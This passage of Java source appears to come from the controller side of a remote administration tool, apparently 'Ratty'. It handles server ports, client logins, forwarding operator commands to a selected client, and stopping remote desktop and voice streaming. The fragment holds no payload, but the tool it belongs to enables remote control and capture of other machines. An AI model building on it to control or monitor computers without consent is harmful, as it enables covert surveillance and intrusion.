			final INotificationGui notification = guiFactory.createNotificationGui(name + " " + address, icon);
			
			notification.trigger();
			PING.play();
		}
	}
	
	@Override
	public void startServer(final int port) {
		final String portString = String.valueOf(port);
		final boolean contains = serverList.containsListEntry(portString);
		
		super.startServer(port);
		
		if (!contains) {
			serverList.addListEntry(portString);
			serverList.setPortInput("");
			
			lastServerStart = System.currentTimeMillis();
		}
	}
	
	@Override
	public void stopServer(final int port) {
		final String portString = String.valueOf(port);
		
		super.stopServer(port);
		
		serverList.removeListEntry(portString);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final ServerClient client = getClient(connection);
		
		if (client == null) {
			return;
		}
		
		final boolean loggedIn = client.isLoggedIn();
		
		if (loggedIn) {
			final boolean consumed = handlePacket(client, packet);
			
			if (!consumed) {
				packet.execute(connection);
			}
		} else if (packet instanceof InformationPacket) {
			final InformationPacket information = (InformationPacket)packet;
			
			logIn(client, information);
		}
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		super.connected(server, connection);
		
		final ServerClient client = new ServerClient(connection, guiFactory);
		
		clients.put(connection, client);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		super.disconnected(connection);
		
		final ServerClient client = getClient(connection);
		
		if (client == null) {
			return;
		}
		
		client.logOut();
		
		gui.removeClient(client);
		clients.remove(connection);
		
		client.removeListener(this);
		client.setStreamingDesktop(false);
		client.setStreamingVoice(false);
	}
	
	@Override
	public void closed(final ActiveServer server) {
		final int port = server.getPort();
		final String portString = String.valueOf(port);
		
		super.closed(server);
		
		serverList.removeListEntry(portString);
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		final ServerClient client;
		
		if (source instanceof ServerClient) {
			client = (ServerClient)source;
		} else if (source instanceof IRattyGui) {
			final IRattyGui gui = (IRattyGui)source;
			
			client = gui.getSelectedClient();
		} else {
			client = null;
		}
		
		if (client != null) {
			final IPacket packet = createPacket(client, command);
			
			if (packet != null) {
				client.connection.addPacket(packet);
			}
			
			handleCommand(client, command);
		}
		
		handleGlobalCommand(command);
	}
	
	public final ServerClient getClient(final ActiveConnection searched) {
		final Set<ActiveConnection> clientSet = clients.keySet();
		
		for (final ActiveConnection connection : clientSet) {
			if (connection == searched) {
				final ServerClient client = clients.get(connection);
				
				return client;
			}
		}
		
		return null;
	}
	
}
